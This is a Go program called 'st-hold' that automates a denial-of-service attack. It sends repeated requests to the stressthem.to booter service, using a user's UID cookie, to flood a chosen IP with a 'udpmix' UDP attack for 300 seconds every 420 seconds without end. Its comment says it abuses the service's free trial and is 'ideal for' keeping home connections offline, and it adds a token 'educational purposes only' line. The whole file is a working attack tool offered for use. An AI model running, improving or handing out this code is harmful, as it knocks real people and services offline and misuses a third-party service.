package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/gookit/color"
	"net/http"
	"os"
	"time"
)

func hold(uid string, ip string) {

	jsonData, err := json.Marshal(map[string]string{
		"method_l4": "udpmix",
		"host":      ip,
		"port":      "80",
		"time":      "300",
	})
	if err != nil {
		fmt.Println(err)
	}

	req, err := http.NewRequest("POST", "https://www.stressthem.to/booter?handle", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println(err)
	}

	req.AddCookie(&http.Cookie{Name: "UID", Value: uid})

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
	}

	// friendly reminder to close stuff
	req.Close = true
	defer resp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)

	switch result["status"] {
	case float64(1):
		// success
	case nil:
		color.Red.Println("invalid uid")
		os.Exit(1)
	default:
		color.Yellow.Printf("%v\n", result["message"])
		color.Yellow.Println("continuing despite error message...")
	}
}

func main() {

	// elite ascii art is a prerequisite for hacking properly

	black := color.FgBlack.Render
	blue := color.FgBlue.Render
	cyan := color.FgCyan.Render

	fmt.Printf("%s\n", black("https://github.com/rip/st-hold"))
	color.Magenta.Println("     _         _          _     _ ")
	color.Magenta.Println(" ___| |_  ___ | |_   ___ | | __| |")
	color.Magenta.Println("(_-<|  _||___|| ' \\ / _ \\| |/ _` |")
	color.Magenta.Println("/__/ \\__|     |_||_|\\___/|_|\\__,_|")

	uid := flag.String("uid", "", "")
	ip := flag.String("ip", "", "")
	h := flag.Bool("h", false, "help")

	flag.Parse()

	if *h {
		color.Green.Println("example: ./st-hold -uid abc-123-u-i-d -ip 127.0.0.1")
		os.Exit(1)
	}

	if *uid == "" || *ip == "" {
		color.Red.Println("-h for help")
		os.Exit(1)
	}

	fmt.Printf(blue("Holding %s")+blue("! Ctrl+C to stop.\n"), cyan(*ip))
	for {
		hold(*uid, *ip)
		time.Sleep(420 * time.Second)
	}
}

/*

hold offline; ddos forever

(or at least until a merciful ctrl+c keypress)

ideal for (static) home connections

abuses stressthem.to free trial

loops gigabit per second attack for 300 seconds every 420 seconds

(lulz giving them false hope for 2 mins + unrequired cooldown grace period)

educational purposes only

ddosing, hacking, etc iz illegal

*/
